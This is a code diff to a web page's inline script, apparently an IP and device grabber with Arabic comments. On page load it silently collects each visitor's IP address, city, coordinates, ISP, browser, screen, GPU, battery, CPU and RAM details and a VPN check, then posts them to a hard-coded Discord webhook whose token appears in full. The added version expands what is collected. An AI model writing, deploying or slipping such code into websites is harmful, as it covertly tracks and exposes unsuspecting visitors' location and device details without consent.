@@ -119,63 +119,114 @@
   
     
 <script>
-fetch('https://ipinfo.io/json')
-    .then(response => response.json())
-    .then(data => {
-        const ip = data.ip;
-        const country = data.country || "Unknown";
-        const city = data.city || "Unknown";
-        const region = data.region || "Unknown";
-        const org = data.org || "Unknown"; // مزود خدمة الإنترنت (ISP)
-        const loc = data.loc || "Unknown"; // إحداثيات خط الطول والعرض
-        const dateTime = new Date().toLocaleString();
+async function getExtraDeviceInfo() {
+    let batteryLevel = "Unknown";
+    let isCharging = "Unknown";
+    
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100) + "%";
+        isCharging = battery.charging ? "Yes" : "No";
+    }
 
-        // استخراج معلومات الجهاز والمتصفح
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const language = navigator.language;
-        const screenSize = `${screen.width}x${screen.height}`;
+    return {
+        cpuCores: navigator.hardwareConcurrency || "Unknown",
+        ramSize: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+        gpu: getGPUInfo(),
+        battery: `${batteryLevel} (Charging: ${isCharging})`,
+        numWindows: window.length || "Unknown"
+    };
+}
 
-        // معلومات الاتصال (إذا كانت مدعومة)
-        let connectionType = "Unknown";
-        if (navigator.connection) {
-            connectionType = navigator.connection.effectiveType || "Unknown";
-        }
+function getGPUInfo() {
+    let gl = document.createElement('canvas').getContext('webgl');
+    if (!gl) return "Unknown GPU";
+    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+}
 
-        // رابط الـ Webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1350692886525771818/OvIkSed-C9RnAqXo456dO8RvpZ6vZCeSiC9sSBd_bEDU2Yynd9wt0YJHMtRPS7Jqksck';
+async function testInternetSpeed() {
+    const startTime = performance.now();
+    await fetch('https://speed.hetzner.de/100MB.bin', { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
+    const duration = (performance.now() - startTime) / 1000;
+    const downloadSpeed = (100 / duration).toFixed(2) + " MB/s";
+    return downloadSpeed;
+}
 
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", webhookUrl, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        
-        const dataToSend = {
-            content: `📡 **New Connection Data** 📡\n\n` +
-                     `📍 **Location:** ${country}, ${region}, ${city}\n` +
-                     `🌎 **Coordinates:** ${loc}\n` +
-                     `📡 **ISP:** ${org}\n` +
-                     `🔗 **IP Address:** ${ip}\n\n` +
-                     `💻 **Device Info:**\n` +
-                     `🖥️ **Platform:** ${platform}\n` +
-                     `🌐 **Browser:** ${userAgent}\n` +
-                     `🖥️ **Screen Size:** ${screenSize}\n` +
-                     `🗣️ **Language:** ${language}\n` +
-                     `📶 **Connection Type:** ${connectionType}\n\n` +
-                     `🕒 **Time:** ${dateTime}`
-        };
+async function checkVPN() {
+    try {
+        let rtc = new RTCPeerConnection();
+        rtc.createDataChannel('');
+        rtc.createOffer().then(o => rtc.setLocalDescription(o));
+        return new Promise(resolve => {
+            rtc.onicecandidate = ice => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("Unknown");
+                resolve(ice.candidate.candidate.includes("relay") ? "Yes (VPN/Proxy Detected)" : "No");
+            };
+        });
+    } catch {
+        return "Unknown";
+    }
+}
 
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                if (xhr.status === 204) {
-                    console.log("✅ Webhook sent successfully!");
-                } else {
-                    console.error("❌ Error sending Webhook:", xhr.status, xhr.responseText);
+async function sendToWebhook() {
+    const deviceInfo = await getExtraDeviceInfo();
+    const internetSpeed = await testInternetSpeed();
+    const vpnStatus = await checkVPN();
+
+    fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const country = data.country || "Unknown";
+            const city = data.city || "Unknown";
+            const region = data.region || "Unknown";
+            const org = data.org || "Unknown"; 
+            const loc = data.loc || "Unknown"; 
+            const dateTime = new Date().toLocaleString();
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1350692886525771818/OvIkSed-C9RnAqXo456dO8RvpZ6vZCeSiC9sSBd_bEDU2Yynd9wt0YJHMtRPS7Jqksck';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            const dataToSend = {
+                content: `📡 **New Connection Data** 📡\n\n` +
+                         `📍 **Location:** ${country}, ${region}, ${city}\n` +
+                         `🌎 **Coordinates:** ${loc}\n` +
+                         `📡 **ISP:** ${org}\n` +
+                         `🔗 **IP Address:** ${ip}\n\n` +
+                         `💻 **Device Info:**\n` +
+                         `🖥️ **Platform:** ${navigator.platform}\n` +
+                         `🌐 **Browser:** ${navigator.userAgent}\n` +
+                         `🖥️ **Screen Size:** ${screen.width}x${screen.height}\n` +
+                         `🗣️ **Language:** ${navigator.language}\n` +
+                         `📶 **Connection Type:** ${navigator.connection ? navigator.connection.effectiveType : "Unknown"}\n` +
+                         `🧠 **CPU Cores:** ${deviceInfo.cpuCores}\n` +
+                         `💾 **RAM Size:** ${deviceInfo.ramSize}\n` +
+                         `🎮 **GPU:** ${deviceInfo.gpu}\n` +
+                         `🔋 **Battery:** ${deviceInfo.battery}\n` +
+                         `🖥️ **Open Windows:** ${deviceInfo.numWindows}\n` +
+                         `🚀 **Internet Speed:** ${internetSpeed}\n` +
+                         `🛡️ **VPN/Proxy:** ${vpnStatus}\n\n` +
+                         `🕒 **Time:** ${dateTime}`
+            };
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 204) {
+                        console.log("✅ Webhook sent successfully!");
+                    } else {
+                        console.error("❌ Error sending Webhook:", xhr.status, xhr.responseText);
+                    }
                 }
-            }
-        };
+            };
 
-        xhr.send(JSON.stringify(dataToSend));
-    })
-    .catch(error => console.error('❌ Error fetching IP:', error));
+            xhr.send(JSON.stringify(dataToSend));
+        })
+        .catch(error => console.error('❌ Error fetching IP:', error));
+}
+
+sendToWebhook();
 </script>
-
